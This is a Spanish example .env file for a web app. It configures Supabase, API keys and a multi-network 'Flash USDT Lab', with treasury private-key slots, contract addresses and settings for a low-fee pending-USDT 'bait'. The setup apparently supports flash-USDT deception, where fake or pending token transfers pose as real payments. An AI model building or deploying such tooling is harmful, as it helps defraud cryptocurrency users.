# Supabase (proyecto nuevo — Settings → API)
NEXT_PUBLIC_SUPABASE_URL=https://tu-proyecto.supabase.co
NEXT_PUBLIC_SUPABASE_ANON_KEY=tu-anon-key
SUPABASE_SERVICE_ROLE_KEY=tu-service-role-key

# Arkham Intelligence — opcional
ARKHAM_API_KEY=tu-arkham-api-key

# Cron secret (protege /api/cron/* en producción)
CRON_SECRET=genera-un-string-aleatorio-aqui

# ============================================================
# LAB FLASH USDT — MULTI-RED (BSC + Ethereum en un despliegue)
# ============================================================
# Treasury compartida (misma wallet, fondos en BSC y ETH por separado).
# Despliega FlashUSDTLab.sol en cada red y configura su contrato.
# NUNCA subas private keys a git.

# Private key de la wallet treasury (solo servidor — local + Vercel)
EVM_LAB_TREASURY_PRIVATE_KEY=0x-tu-private-key-de-wallet-lab-dedicada

# Etherscan API v2 (verificación BSC + Ethereum + Polygon desde backoffice)
EVM_EXPLORER_API_KEY=tu-etherscan-api-key

# Red por defecto al crear sesión si no se elige otra
EVM_NETWORK=bsc

# --- BSC ---
EVM_BSC_FLASH_USDT_LAB_CONTRACT=0x-contrato-flashUSDTLab-bsc
EVM_BSC_RPC_URL=https://bsc-dataseed.binance.org
# USDT oficial: 0x55d398326f99059fF775485246999027B3197955

# --- Ethereum mainnet ---
EVM_ETHEREUM_FLASH_USDT_LAB_CONTRACT=0x-contrato-flashUSDTLab-ethereum
EVM_ETHEREUM_RPC_URL=https://eth.llamarpc.com
# USDT oficial: 0xdAC17F958D2ee523a2206206994597C13D831ec7

# --- Polygon (opcional) ---
# EVM_POLYGON_FLASH_USDT_LAB_CONTRACT=0x...
# EVM_POLYGON_RPC_URL=https://polygon-rpc.com

# Legacy (solo si usas UNA red — equivalente a EVM_BSC_* si EVM_NETWORK=bsc)
# EVM_FLASH_USDT_LAB_CONTRACT=0x...
# EVM_RPC_URL=https://bsc-dataseed.binance.org

# Cebo pending USDT oficial
EVM_PENDING_BAIT_MAX_FEE_GWEI=0.05
EVM_PENDING_BAIT_RENEWAL_MINUTES=15
EVM_FLASH_RENEW_BEFORE_MINUTES=60

LAB_ADMIN_EMAILS=tu-email@ejemplo.com

CTECH_BASE_URL=https://tu-app.vercel.app
